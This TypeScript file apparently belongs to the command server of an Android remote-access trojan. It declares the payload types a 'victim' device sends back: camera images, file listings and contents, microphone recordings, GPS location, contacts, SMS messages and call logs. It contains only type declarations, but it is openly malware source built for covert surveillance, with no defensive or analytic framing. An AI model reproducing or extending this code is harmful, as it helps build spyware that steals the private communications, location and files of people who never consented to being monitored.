import { type VictimOrder } from '../enums/VictimOrder';

export type CameraOrderPayload =
    | { camList: true; list: Array<{ name: string; id: number }> }
    | {
          image: true;
          buffer: Buffer;
      };

export type FileManagerPayload =
    | Array<{
          name: string;
          isDir: boolean;
          path: string;
      }>
    | FilePayload;

export interface FilePayload {
    file: true;
    name: string;
    buffer: Buffer;
}

export interface LocationPayload {
    enable: boolean;
    lat: number;
    lng: number;
}

export interface ContactsPayload {
    contactsList: Array<{
        phoneNo: string;
        name: string;
    }>;
}

export type SMSPayload =
    | boolean
    | {
          smsList: Array<{
              phoneNo: string;
              msg: string;
          }>;
      };

export interface CallLogPayload {
    callsList: Array<{
        phoneNo: string;
        name: string;
        duration: string;
        type: number;
    }>;
}

type OrderCallback<T> = (data: T) => void;

export interface IVictimToServerEvents {
    [VictimOrder.CAMERA]: OrderCallback<CameraOrderPayload>;
    [VictimOrder.FILE_MANAGER]: OrderCallback<FileManagerPayload>;
    [VictimOrder.MICROPHONE]: OrderCallback<FilePayload>;
    [VictimOrder.LOCATION]: OrderCallback<LocationPayload>;
    [VictimOrder.CONTACTS]: OrderCallback<ContactsPayload>;
    [VictimOrder.SMS]: OrderCallback<SMSPayload>;
    [VictimOrder.CALLS]: OrderCallback<CallLogPayload>;
}
